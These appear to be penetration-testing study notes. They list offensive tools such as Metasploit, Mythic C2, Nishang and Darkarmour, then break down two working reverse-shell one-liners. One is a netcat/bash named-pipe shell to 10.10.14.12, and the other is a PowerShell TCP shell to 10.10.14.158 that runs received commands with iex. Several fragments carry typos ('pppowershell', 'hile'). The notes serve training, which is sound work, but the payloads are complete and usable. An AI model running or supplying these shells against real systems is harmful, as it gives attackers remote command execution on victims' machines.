|**Resource**|**Description**|
|---|---|
|`MSFVenom & Metasploit-Framework`|[Source](https://github.com/rapid7/metasploit-framework) MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.|
|`Payloads All The Things`|[Source](https://github.com/swisskyrepo/PayloadsAllTheThings) Here, you can find many different resources and cheat sheets for payload generation and general methodology.|
|`Mythic C2 Framework`|[Source](https://github.com/its-a-feature/Mythic) The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.|
|`Nishang`|[Source](https://github.com/samratashok/nishang) Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.|
|`Darkarmour`|[Source](https://github.com/bats3c/darkarmour) Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.|

## One-Liners Examined
#### Netcat/Bash Reverse Shell One-liner
 ```shell-session
$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```
#### Remove /tmp/f
```shell-session
rm -f /tmp/f; 
```

#### Make A Named Pipe
```shell-session
mkfifo /tmp/f; 
```
#### Output Redirection
```shell-session
cat /tmp/f | 
```
#### Set Shell Options
```shell-session
/bin/bash -i 2>&1 | 
```
#### Open a Connection with Netcat
```shell-session
nc 10.10.14.12 7777 > /tmp/f  
```

## PowerShell One-liner Explained
```cmd session
pppowershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
#### Calling PowerShell
```cmd-session
powershell -nop -c 
```
#### Binding A Socket
```cmd-session
"$client = New-Object System.Net.Sockets.TCPClient(10.10.14.158,443);
```
#### Setting The Command Stream
```cmd-session
$stream = $client.GetStream();
```
#### Empty Byte Stream
```cmd-session
[byte[]]$bytes = 0..65535|%{0}; 
```
#### Stream Parameters
```cmd-session
hile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
#### Set The Byte Encoding
```cmd-session
{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
#### Invoke-Expression
```cmd-session
$sendback = (iex $data 2>&1 | Out-String ); 
```
#### Show Working Directory
```cmd-session
$sendback2 = $sendback + 'PS ' + (pwd).path + '> '; 
```
#### Sets Sendbyte
```cmd-session
$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```
#### Terminate TCP Connection
```cmd-session
$client.Close()"
```

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
